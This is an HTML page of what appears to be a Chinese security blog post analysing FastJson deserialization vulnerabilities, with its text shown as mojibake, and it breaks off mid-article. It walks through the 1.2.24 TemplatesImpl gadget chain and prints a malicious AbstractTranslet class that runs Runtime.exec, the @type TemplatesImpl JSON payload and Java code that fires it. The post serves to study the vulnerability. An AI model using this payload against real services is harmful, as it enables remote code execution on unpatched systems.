<!DOCTYPE html>
<html lang="en" dir="auto">

<head><meta charset="utf-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“ | Reus09&#39;s Blog</title>
<meta name="keywords" content="">
<meta name="description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™">
<meta name="author" content="Reus09">
<link rel="canonical" href="/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/">
<link crossorigin="anonymous" href="/assets/css/stylesheet.40573d180b208ab15c3bf0a170c2ac86aa8ccf179f96f939352198fbee79100e.css" integrity="sha256-QFc9GAsgirFcO/ChcMKshqqMzxeflvk5NSGY&#43;&#43;55EA4=" rel="preload stylesheet" as="style">
<script defer crossorigin="anonymous" src="/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js" integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG&#43;9vmJ0cTS&#43;ovo0FeA="
    onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="16x16" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="icon" type="image/png" sizes="32x32" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="apple-touch-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<link rel="mask-icon" href="https://cnblog-img-reus09.oss-cn-beijing.aliyuncs.com/image/20211103151005.jpeg">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
    <style>
        @media (prefers-color-scheme: dark) {
            :root {
                --theme: rgb(29, 30, 32);
                --entry: rgb(46, 46, 51);
                --primary: rgb(218, 218, 219);
                --secondary: rgb(155, 156, 157);
                --tertiary: rgb(65, 66, 68);
                --content: rgb(196, 196, 197);
                --hljs-bg: rgb(46, 46, 51);
                --code-bg: rgb(55, 56, 62);
                --border: rgb(51, 51, 51);
            }

            .list {
                background: var(--theme);
            }

            .list:not(.dark)::-webkit-scrollbar-track {
                background: 0 0;
            }

            .list:not(.dark)::-webkit-scrollbar-thumb {
                border-color: var(--theme);
            }
        }

    </style>
</noscript><meta property="og:title" content="FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“" />
<meta property="og:description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™" />
<meta property="og:type" content="article" />
<meta property="og:url" content="/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/" /><meta property="article:section" content="posts" />
<meta property="article:published_time" content="2022-10-12T14:04:36+08:00" />
<meta property="article:modified_time" content="2022-10-12T14:04:36+08:00" />

<meta name="twitter:card" content="summary"/>
<meta name="twitter:title" content="FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“"/>
<meta name="twitter:description" content="å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™"/>


<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "ğŸ“šæ–‡ç« ",
      "item": "/posts/"
    }, 
    {
      "@type": "ListItem",
      "position":  3 ,
      "name": "ğŸ‘¨ğŸ»â€ğŸ’»æŠ€æœ¯",
      "item": "/posts/tech/"
    }, 
    {
      "@type": "ListItem",
      "position":  4 ,
      "name": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
      "item": "/posts/tech/fastjson%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
  "name": "FastJsonååºåˆ—åŒ–æ¼æ´æ€»ç»“",
  "description": "å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™",
  "keywords": [
     null 
  ],
  "articleBody": "å®é™…ä¸Šï¼Œå‰ä¸ä¹…åˆšåˆšåˆ†æäº†FastJson1.2.80æ¼æ´ï¼Œä¸€æ–¹é¢å¯¹Javaååºåˆ—åŒ–æ¼æ´æœ‰äº†ä¸€ä¸ªåˆæ­¥çš„äº†è§£ï¼Œå¦‚æœå¯ä»¥æ§åˆ¶ä¸€ä¸ªç±»çš„å®ä¾‹åŒ–ï¼Œå¹¶ä¸”è¿™ä¸ªç±»é‡Œé¢çš„æˆå‘˜ä¹Ÿå­˜åœ¨å¯æ§ï¼Œå°±å¯ä»¥æ³¨å…¥æ¶æ„JSONå®ç°ååºåˆ—æ¼æ´ï¼Œå¦ä¸€æ–¹é¢ç”±äºFastJson1.2.25ä¹‹åéƒ½æ˜¯å¯¹AutoTypeæœºåˆ¶è¿›è¡Œç»•è¿‡ï¼Œæ‰€ä»¥ä¹Ÿç®€å•å­¦ä¹ äº†AutoTypeCheckæœºåˆ¶ï¼Œè¿˜æœ‰ä¸€äº›æœŸæœ›ç±»çš„Gadgetã€‚æœ¬æ–‡ä¸»è¦å¯¹FastJsonå¸¸ç”¨çš„çš„è§£æStringçš„parse,parseObjectç­‰æ–¹æ³•è¿›è¡Œåˆ†æï¼Œç„¶ååˆ†æAutoTypeCheckæœºåˆ¶ï¼ŒåŒæ—¶ä¹Ÿå¯¹FastJsonå†å²æ¼æ´è¿›è¡Œç®€å•çš„æ•´ç†ã€‚\næ¼æ´ä»‹ç» è¿™é‡Œå°±å†ä»‹ç»ä¸€ä¸‹FastJsonçš„èƒŒæ™¯ã€‚\nfastjson æ˜¯é˜¿é‡Œå·´å·´çš„å¼€æº JSON è§£æåº“ï¼Œå®ƒå¯ä»¥è§£æ JSON æ ¼å¼çš„å­—ç¬¦ä¸²ï¼Œæ”¯æŒå°† Java Bean åºåˆ—åŒ–ä¸º JSON å­—ç¬¦ä¸²ï¼Œä¹Ÿå¯ä»¥ä» JSON å­—ç¬¦ä¸²ååºåˆ—åŒ–åˆ° JavaBeanã€‚\nç”±äºå…¶ç‰¹ç‚¹æ˜¯å¿«ï¼Œä»¥æ€§èƒ½ä¸ºä¼˜åŠ¿å¿«é€Ÿå é¢†äº†å¤§é‡ç”¨æˆ·ï¼Œå¹¶ä¸”å…¶ API ååˆ†ç®€æ´ï¼Œç”¨æˆ·é‡ååˆ†åºå¤§ï¼Œè¿™ä¹Ÿå°±å¯¼è‡´äº†è¿™æ ·çš„ç»„ä»¶ä¸€æ—¦çˆ†å‡ºæ¼æ´ï¼Œå±å®³ä¹Ÿå°†ä¼šæ˜¯å·¨å¤§çš„ï¼Œå› æ­¤ï¼Œfastjson ä»ç¬¬ä¸€æ¬¡æŠ¥å‘Šå®‰å…¨æ¼æ´è‡³ä»Šï¼Œè¿›è¡Œäº†è‹¥å¹²æ¬¡çš„å®‰å…¨æ›´æ–°ï¼Œä¹Ÿä¸å®‰å…¨ç ”ç©¶äººå‘˜è¿›è¡Œäº†æ¥æ¥å›å›å¤šæ¬¡çš„å®‰å…¨è¡¥ä¸-ç»•è¿‡çš„æµç¨‹ã€‚\nè¿™é‡Œæ”¾ä¸€ä¸‹æ¡†æ¶å›¾\nä¸»è¦åŠŸèƒ½åœ¨DefaultJSONParserç±»ä¸­å®ç°çš„ï¼Œåœ¨è¿™ä¸ªç±»ä¸­ä¼šåº”ç”¨å…¶ä»–çš„ä¸€äº›å¤–éƒ¨ç±»æ¥å®Œæˆåç»­æ“ä½œã€‚ParserConfigä¸»è¦æ˜¯è¿›è¡Œé…ç½®ä¿¡æ¯çš„åˆå§‹åŒ–ï¼ŒJSONLexerä¸»è¦æ˜¯å¯¹jsonå­—ç¬¦ä¸²è¿›è¡Œå¤„ç†å¹¶åˆ†æï¼Œååºåˆ—åŒ–åœ¨JavaBeanDeserializerä¸­å¤„ç†ã€‚\nååºåˆ—åŒ–æ–¹æ³• å°† json æ•°æ®ååºåˆ—åŒ–æ—¶å¸¸ä½¿ç”¨çš„æ–¹æ³•ä¸ºparse()ã€parseObject()ã€parseArray()ï¼Œè¿™ä¸‰ä¸ªæ–¹æ³•ä¹Ÿå‡åŒ…å«è‹¥å¹²é‡è½½æ–¹æ³•ï¼Œå¸¦æœ‰ä¸åŒå‚æ•°ï¼š\nååºåˆ—åŒ–ç‰¹æ€§ï¼šcom.alibaba.fastjson.parser.Featureï¼Œ ç±»çš„ç±»å‹ï¼šjava.lang.reflect.Typeï¼Œç”¨æ¥æ‰§è¡Œååºåˆ—åŒ–ç±»çš„ç±»å‹ã€‚ å¤„ç†æ³›å‹ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.TypeReferenceã€‚ ç¼–ç¨‹æ‰©å±•å®šåˆ¶ååºåˆ—åŒ–ï¼šcom.alibaba.fastjson.parser.deserializer.ParseProcessï¼Œä¾‹å¦‚ExtraProcessor ç”¨äºå¤„ç†å¤šä½™çš„å­—æ®µï¼ŒExtraTypeProvider ç”¨äºå¤„ç†å¤šä½™å­—æ®µæ—¶æä¾›ç±»å‹ä¿¡æ¯ã€‚ è¿™é‡Œåˆ—ä¸¾ä¸€äº› fastjson åŠŸèƒ½è¦ç‚¹ï¼š\nä½¿ç”¨ JSON.parse(jsonString) å’Œ JSON.parseObject(jsonString, Target.class)ï¼Œä¸¤è€…è°ƒç”¨é“¾ä¸€è‡´ï¼Œå‰è€…ä¼šåœ¨ jsonString ä¸­è§£æå­—ç¬¦ä¸²è·å– @type æŒ‡å®šçš„ç±»ï¼Œåè€…åˆ™ä¼šç›´æ¥ä½¿ç”¨å‚æ•°ä¸­çš„classã€‚ fastjson åœ¨åˆ›å»ºä¸€ä¸ªç±»å®ä¾‹æ—¶ä¼šé€šè¿‡åå°„è°ƒç”¨ç±»ä¸­ç¬¦åˆæ¡ä»¶çš„ getter/setter æ–¹æ³•ï¼Œå…¶ä¸­ getter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ã€ä¸æ˜¯é™æ€æ–¹æ³•ã€ä»¥ get å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€æ–¹æ³•ä¸èƒ½æœ‰å‚æ•°ä¼ å…¥ã€ç»§æ‰¿è‡ª Collection|Map|AtomicBoolean|AtomicInteger|AtomicLongã€æ­¤å±æ€§æ²¡æœ‰ setter æ–¹æ³•ï¼›setter æ–¹æ³•éœ€æ»¡è¶³æ¡ä»¶ï¼šæ–¹æ³•åé•¿äº 4ï¼Œä»¥ set å¼€å¤´ä¸”ç¬¬4ä½æ˜¯å¤§å†™å­—æ¯ã€éé™æ€æ–¹æ³•ã€è¿”å›ç±»å‹ä¸º void æˆ–å½“å‰ç±»ã€å‚æ•°ä¸ªæ•°ä¸º 1 ä¸ªã€‚å…·ä½“é€»è¾‘åœ¨ com.alibaba.fastjson.util.JavaBeanInfo.build() ä¸­ã€‚ ä½¿ç”¨ JSON.parseObject(jsonString) å°†ä¼šè¿”å› JSONObject å¯¹è±¡ï¼Œä¸”ç±»ä¸­çš„æ‰€æœ‰ getter ä¸setter éƒ½è¢«è°ƒç”¨ã€‚ å¦‚æœç›®æ ‡ç±»ä¸­ç§æœ‰å˜é‡æ²¡æœ‰ setter æ–¹æ³•ï¼Œä½†æ˜¯åœ¨ååºåˆ—åŒ–æ—¶ä»æƒ³ç»™è¿™ä¸ªå˜é‡èµ‹å€¼ï¼Œåˆ™éœ€è¦ä½¿ç”¨ Feature.SupportNonPublicField å‚æ•°ã€‚ fastjson åœ¨ä¸ºç±»å±æ€§å¯»æ‰¾ get/set æ–¹æ³•æ—¶ï¼Œè°ƒç”¨å‡½æ•° com.alibaba.fastjson.parser.deserializer.JavaBeanDeserializer#smartMatch() æ–¹æ³•ï¼Œä¼šå¿½ç•¥ _|- å­—ç¬¦ä¸²ï¼Œä¹Ÿå°±æ˜¯è¯´å“ªæ€•ä½ çš„å­—æ®µåå« _a_g_e_ï¼Œgetter æ–¹æ³•ä¸º getAge()ï¼Œfastjson ä¹Ÿå¯ä»¥æ‰¾å¾—åˆ°ï¼Œåœ¨ 1.2.36 ç‰ˆæœ¬åŠåç»­ç‰ˆæœ¬è¿˜å¯ä»¥æ”¯æŒåŒæ—¶ä½¿ç”¨ _ å’Œ - è¿›è¡Œç»„åˆæ··æ·†ã€‚ fastjson åœ¨ååºåˆ—åŒ–æ—¶ï¼Œå¦‚æœ Field ç±»å‹ä¸º byte[]ï¼Œå°†ä¼šè°ƒç”¨com.alibaba.fastjson.parser.JSONScanner#bytesValue è¿›è¡Œ base64 è§£ç ï¼Œå¯¹åº”çš„ï¼Œåœ¨åºåˆ—åŒ–æ—¶ä¹Ÿä¼šè¿›è¡Œ base64 ç¼–ç ã€‚ ä¸ºäº†æµ‹è¯•ä»¥ä¸Šå†…å®¹ï¼Œæˆ‘ä»¬å†™ä¸€ä¸ªdemo\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 package com.reus09; import com.alibaba.fastjson.JSON; import java.io.UnsupportedEncodingException; import java.util.Arrays; import java.util.Properties; import java.util.Base64; /** * @ClassName FastJsonTest * @Description TODO * @Author reus09 * @Date 2022/10/11 19:34 * @Version 1.0 **/ public class FastJsonTest { public String t1; private Integer t2; private Boolean t3; private Properties t4; private Properties t5; private byte[] t6; @Override public String toString() { return \"FastJsonTest{\" + \"t1='\" + t1 + '\\'' + \", t2=\" + t2 + \", t3=\" + t3 + \", t4=\" + t4 + \", t5=\" + t5 + \", t6=\" + Arrays.toString(t6) + '}'; } public byte[] getT6() { return t6; } public void setT6(byte[] t6) { this.t6 = t6; } public FastJsonTest() { System.out.println(\"FastJsonTest() is called \"); } public void setT5(Properties t5) { System.out.println(\"setT5()\"); this.t5 = t5; } public void setT1(String t1) { System.out.println(\"setT1()\"); this.t1 = t1; } public void setT2(Integer t2) { System.out.println(\"setT2()\"); this.t2 = t2; } public String getT1() { System.out.println(\"getT1()\"); return t1; } public Integer getT2() { System.out.println(\"getT2()\"); return t2; } public Boolean getT3() { System.out.println(\"getT3()\"); return t3; } public Properties getT4() { System.out.println(\"getT4()\"); return t4; } public Properties getT5() { System.out.println(\"getT5()\"); return t5; } public static void main(String[] args) throws UnsupportedEncodingException { String jsonString = \"{\\\"@type\\\":\\\"com.reus09.FastJsonTest\\\",\\\"t1\\\":\\\"t1\\\",\\\"t2\\\":1,\\\"t3\\\":1,\\\"t4\\\":{},\\\"t5\\\":{},\\\"t6\\\":\\\"\"+Base64.getEncoder().encodeToString(\"Hello,FastJson\".getBytes(\"utf-8\"))+\"\\\"}\"; System.out.println(\"---------JSON.parse(string)-----------\"); Object obj = JSON.parse(jsonString); System.out.println(obj); System.out.println(\"---------JSON.parseObject(string,clazz)-----------\"); Object obj1 = JSON.parseObject(jsonString,FastJsonTest.class); System.out.println(obj1); System.out.println(\"---------JSON.parseObject(string)-----------\"); Object obj2 = JSON.parseObject(jsonString); System.out.println(obj2); } } è¿è¡Œç»“æœï¼š\næ€»çš„æ¥è¯´ï¼Œparse(string),parseObject(string,clazzs)ä¸parseObject(string)è¿›è¡Œååºåˆ—åŒ–æ—¶çš„ç»†èŠ‚åŒºåˆ«åœ¨äºï¼Œparse(string) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ setter æ–¹æ³•ï¼Œè€Œ parseObject(string) ç”±äºè¦å°†è¿”å›å€¼è½¬åŒ–ä¸ºJSONObjectï¼Œå¤šæ‰§è¡Œäº† JSON.toJSON(obj)ï¼Œæ‰€ä»¥åœ¨å¤„ç†è¿‡ç¨‹ä¸­ä¼šè°ƒç”¨ååºåˆ—åŒ–ç›®æ ‡ç±»çš„getter æ–¹æ³•æ¥å°†å‚æ•°èµ‹å€¼ç»™JSONObjectï¼Œæ‰€ä»¥ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼ŒparseObject(string)çš„å±å®³æ€§ç›¸å¯¹ä¼šæ›´å¤§ã€‚\nFastJson 1.2.24åˆ†æ FastJson1.2.24å¼€å¯äº†FastJsonååºåˆ—å®ç°RCEçš„å¤§é—¨\nfastjson é»˜è®¤ä½¿ç”¨ @type æŒ‡å®šååºåˆ—åŒ–ä»»æ„ç±»ï¼Œæ”»å‡»è€…å¯ä»¥é€šè¿‡åœ¨ Java å¸¸è§ç¯å¢ƒä¸­å¯»æ‰¾èƒ½å¤Ÿæ„é€ æ¶æ„ç±»çš„æ–¹æ³•ï¼Œé€šè¿‡ååºåˆ—åŒ–çš„è¿‡ç¨‹ä¸­è°ƒç”¨çš„ getter/setter æ–¹æ³•ï¼Œä»¥åŠç›®æ ‡æˆå‘˜å˜é‡çš„æ³¨å…¥æ¥è¾¾åˆ°ä¼ å‚çš„ç›®çš„ï¼Œæœ€ç»ˆå½¢æˆæ¶æ„è°ƒç”¨é“¾ã€‚æ­¤æ¼æ´å¼€å¯äº† fastjson ååºåˆ—åŒ–æ¼æ´çš„å¤§é—¨ï¼Œä¸ºå®‰å…¨ç ”ç©¶äººå‘˜æä¾›äº†æ–°çš„æ€è·¯ã€‚\nè¿™é‡Œå¯¹1.2.24çš„ä¸¤æ¡å¸¸è§åˆ©ç”¨é“¾TemplatesImpl ååºåˆ—åŒ–å’ŒJdbcRowSetImpl ååºåˆ—åŒ–è¿›è¡Œç®€å•çš„å­¦ä¹ ã€‚\nTemplatesImpl ååºåˆ—åŒ– åˆ†æä¸€ä¸‹æ¼æ´åˆ©ç”¨é“¾çš„å…¨è¿‡ç¨‹ï¼Œå®é™…ä¸Šåœ¨æŸ¥é˜…èµ„æ–™çš„åŒæ—¶ï¼Œå‘ç°å…¶ä¹Ÿæ˜¯CommonsCollections-3é“¾å­çš„åˆ†æï¼Œå› ä¸ºåˆšåˆšæ¥è§¦åˆ°Javaå®‰å…¨,å¯¹CC3é“¾åªæ˜¯ç•¥æœ‰è€³é—»ï¼Œä¹‹åçš„å­¦ä¹ ä¹‹ä¸­ä¼šæ…¢æ…¢å­¦ä¹ CCé“¾çš„å„ç§åˆ©ç”¨å§¿åŠ¿ã€‚\nå‚è€ƒçš„å„ä½å¤§å¸ˆå‚…çš„åšå®¢å…³äºTemplateImplååºåˆ—åŒ–é“¾çš„æ€è€ƒéƒ½æ˜¯ä»æ¼æ´æŒ–æ˜çš„æ€è·¯å¼€å§‹ï¼Œä»getTransletInstance()è¿™ä¸ªå®ä¾‹åŒ–ç‚¹å‡ºå‘ï¼Œéœ€è¦å“ªä¸€ä¸ªåˆ©ç”¨å…ƒç´ å°±å»å¯»æ‰¾ï¼Œæœ€åå®Œå–„åˆ©ç”¨è¿‡ç¨‹ã€‚\nå‡½æ•°æ ˆè°ƒç”¨æƒ…å†µ:\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 exec:348, Runtime (java.lang) :22, Calculartor (com.reus09) newInstance0:-1, NativeConstructorAccessorImpl (sun.reflect) newInstance:62, NativeConstructorAccessorImpl (sun.reflect) newInstance:45, DelegatingConstructorAccessorImpl (sun.reflect) newInstance:423, Constructor (java.lang.reflect) newInstance:442, Class (java.lang) getTransletInstance:455, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) newTransformer:486, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) getOutputProperties:507, TemplatesImpl (com.sun.org.apache.xalan.internal.xsltc.trax) invoke0:-1, NativeMethodAccessorImpl (sun.reflect) invoke:62, NativeMethodAccessorImpl (sun.reflect) invoke:43, DelegatingMethodAccessorImpl (sun.reflect) invoke:498, Method (java.lang.reflect) setValue:85, FieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:83, DefaultFieldDeserializer (com.alibaba.fastjson.parser.deserializer) parseField:773, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:600, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:188, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) deserialze:184, JavaBeanDeserializer (com.alibaba.fastjson.parser.deserializer) parseObject:368, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1327, DefaultJSONParser (com.alibaba.fastjson.parser) parse:1293, DefaultJSONParser (com.alibaba.fastjson.parser) parse:137, JSON (com.alibaba.fastjson) parse:193, JSON (com.alibaba.fastjson) main:117, FastJsonTest (com.reus09) é¦–å…ˆæˆ‘ä»¬åœ¨com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getTransletInstanceå­˜åœ¨ä¸€ä¸ªæˆå‘˜å±æ€§ _classï¼Œæ˜¯ä¸€ä¸ª Class ç±»å‹çš„æ•°ç»„ï¼Œæ•°ç»„é‡Œä¸‹æ ‡ä¸º_transletIndex çš„ç±»ä¼šåœ¨ getTransletInstance() æ–¹æ³•ä¸­ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚\nåŒæ—¶æˆ‘ä»¬å‘ç°com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#newTransformerä¸­è°ƒç”¨äº†getTransletInstance()\næ–¹æ³•,åŒæ—¶,com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl#getOutputPropertiesè°ƒç”¨äº†è¿™é‡Œçš„newTransformer()æ–¹æ³•ã€‚ è¿™é‡Œçš„getOutputProperties()æ–¹æ³•å°±æ˜¯å¯¹TemplatesImplç±»çš„ç§æœ‰å…ƒç´ outputPropertiesçš„getteræ–¹æ³•\né‚£ä¹ˆæˆ‘ä»¬åªè¦æ§åˆ¶_classä»¥åŠ_transletIndexå°±å¯ä»¥å®ç°ä»»æ„ç±»çš„å®ä¾‹åŒ–ï¼Œä»è€Œè§¦å‘æ¼æ´ã€‚\ndefineTransletClasses()ä¸newInstance()åœ¨åŒä¸€æ–¹æ³•å†…ï¼Œäºæ˜¯æŸ¥çœ‹ä¸€ä¸‹defineTransletClasses() çš„é€»è¾‘ã€‚\nå…ˆè¦æ±‚ _bytecodes ä¸ä¸ºç©ºï¼Œæ¥ç€å°±ä¼šè°ƒç”¨è‡ªå®šä¹‰çš„ ClassLoader å»åŠ è½½ _bytecodes ä¸­çš„ byte[] ã€‚è€Œ _bytecodes ä¹Ÿæ˜¯è¯¥ç±»çš„æˆå‘˜å±æ€§ã€‚\n_bytecodeså˜é‡éç©ºå€¼æ—¶ï¼Œç¨‹åºå°†ä¼šæŠŠ_bytecodesæ•°ç»„ä¸­çš„å€¼å¾ªç¯å–å‡ºï¼Œä½¿ç”¨loader.defineClassæ–¹æ³•ä»å­—èŠ‚ç è½¬åŒ–ä¸ºClasså¯¹è±¡ï¼Œéšååèµ‹å€¼ç»™_class[i]ã€‚\nè€Œå¦‚æœè¿™ä¸ªç±»çš„çˆ¶ç±»ä¸º ABSTRACT_TRANSLET ä¹Ÿå°±æ˜¯com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTransletï¼Œå°±ä¼šå°†ç±»æˆå‘˜å±æ€§çš„ï¼Œ_transletIndex è®¾ç½®ä¸ºå½“å‰å¾ªç¯ä¸­çš„æ ‡è®°ä½ï¼Œè€Œå¦‚æœæ˜¯ç¬¬ä¸€æ¬¡è°ƒç”¨ï¼Œå°±æ˜¯_class[0]ã€‚å¦‚æœçˆ¶ç±»ä¸æ˜¯è¿™ä¸ªç±»ï¼Œå°†ä¼šæŠ›å‡ºå¼‚å¸¸ã€‚\né‚£è¿™æ ·ä¸€æ¡å®Œæ•´çš„æ¼æ´è°ƒç”¨é“¾å°±å‘ˆç°å‡ºæ¥äº†ï¼š\næ„é€ ä¸€ä¸ª TemplatesImpl ç±»çš„ååºåˆ—åŒ–å­—ç¬¦ä¸²ï¼Œå…¶ä¸­ _bytecodes æ˜¯æˆ‘ä»¬æ„é€ çš„æ¶æ„ç±»çš„ç±»å­—èŠ‚ç ï¼Œè¿™ä¸ªç±»çš„çˆ¶ç±»æ˜¯ AbstractTransletï¼Œæœ€ç»ˆè¿™ä¸ªç±»ä¼šè¢«åŠ è½½å¹¶ä½¿ç”¨ newInstance() å®ä¾‹åŒ–ã€‚ åœ¨ååºåˆ—åŒ–è¿‡ç¨‹ä¸­ï¼Œç”±äºgetteræ–¹æ³• getOutputProperties()ï¼Œæ»¡è¶³æ¡ä»¶ï¼Œå°†ä¼šè¢« fastjson è°ƒç”¨ï¼Œè€Œè¿™ä¸ªæ–¹æ³•è§¦å‘äº†æ•´ä¸ªæ¼æ´åˆ©ç”¨æµç¨‹ï¼šgetOutputProperties() -\u003e newTransformer() -\u003e getTransletInstance() -\u003e defineTransletClasses() / EvilClass.newInstance(). åŒæ—¶ä¸ºäº†ç¨‹åºåœ¨å®ä¾‹åŒ–ä¹‹å‰å› æŠ¥é”™é€€å‡ºï¼Œéœ€è¦å°†_nameå’Œ_tfactoryè®¾ç½®ä¸ä¸ºç©ºï¼Œ_tfactoryå¦‚æœä¸æŒ‡å®šä¼šå‡ºç°ç©ºæŒ‡é’ˆã€‚æŸ¥çœ‹_tfactoryçš„å®šä¹‰å¦‚ä¸‹ï¼š\n1 private transient TransformerFactoryImpl _tfactory = null; å…·ä½“å®ç°ï¼š\nä¸€ä¸ªç»§æ‰¿äº†AbstractTransletçš„æ¶æ„ç±»,å°†å…¶ç¼–è¯‘æˆå­—èŠ‚ç ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 package com.reus09; import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.TransletException; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import java.io.IOException; /** * @ClassName Calculartor * @Description TODO * @Author reus09 * @Date 2022/10/12 15:42 * @Version 1.0 **/ public class Calculartor extends AbstractTranslet { static { try { Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (IOException e) { e.printStackTrace(); } } @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException { } @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException { } } payloadéƒ¨åˆ†ï¼š\nJSONå¯¹åº”çš„å¦‚ä¸‹:\n1 2 3 4 5 6 7 { \"@type\": \"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\", \"_bytecodes\": [\"yv66vgAAADQA...CJAAk=\"], \"_name\": \"reus09\", \"_tfactory\": {}, \"_outputProperties\": {}, } ä»£ç å¦‚ä¸‹:\n1 2 3 4 byte[] code = Files.readAllBytes(Paths.get(\"/Users/reus09/Desktop/rce/FastJson/target/classes/com/reus09/Calculartor.class\")); String codeString = Base64.getEncoder().encodeToString(code); String payload = \"{\\\"@type\\\":\\\"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl\\\",\\\"_bytecodes\\\":[\\\"\"+Base64.getEncoder().encodeToString(code)+\"\\\"],\\\"_name\\\":\\\"reus09\\\",\\\"_tfactory\\\":{ },\\\"_outputProperties\\\":{ },\\\"_version\\\":\\\"1.0\\\",\\\"allowedProtocols\\\":\\\"all\\\"}\"; JSON.parse(payload, Feature.SupportNonPublicField); JdbcRowSetImpl ååºåˆ—åŒ– JdbcRowSetImpl ç±»ä½äº com.sun.rowset.JdbcRowSetImpl ï¼Œæ˜¯ 